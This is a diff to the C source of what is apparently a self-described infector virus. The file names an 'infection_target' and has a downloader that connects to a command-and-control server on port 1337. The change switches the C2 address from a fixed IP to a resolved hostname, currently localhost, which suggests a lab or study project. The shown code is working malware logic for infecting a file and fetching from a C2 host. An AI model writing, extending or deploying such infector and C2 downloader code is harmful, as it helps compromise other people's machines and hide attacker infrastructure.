@@ -9,6 +9,7 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+#include <netdb.h>
 
 // macros to simplify writing function attributes
 #define always_inline __attribute__((always_inline))
@@ -23,7 +24,7 @@
 #define infection_target "./test"
 
 #define port 1337
-#define addr "127.0.0.1"
+#define hostname "localhost"
 
 // reference to allow use of environment pointer
 extern char** environ;
@@ -176,12 +177,20 @@ void downloader(){
   int socket_fd;
   int connection = -1;
   struct sockaddr_in server;
+  struct hostent *he;
+  struct in_addr **addr_list;
+  char* ip;
 
+  // resolve hostname to ip addr
+  he = gethostbyname(hostname);
+  addr_list = (struct in_addr **) he->h_addr_list;
+  ip = inet_ntoa(*addr_list[0]);
+  
   // set up socket to connect to c2
   socket_fd = socket(AF_INET, SOCK_STREAM, 0);
   server.sin_family = AF_INET;
   server.sin_port = htons(port);
-  server.sin_addr.s_addr = inet_addr(addr);
+  server.sin_addr.s_addr = inet_addr(ip);
 
   // loop until connection is established
   while(connection < 0){
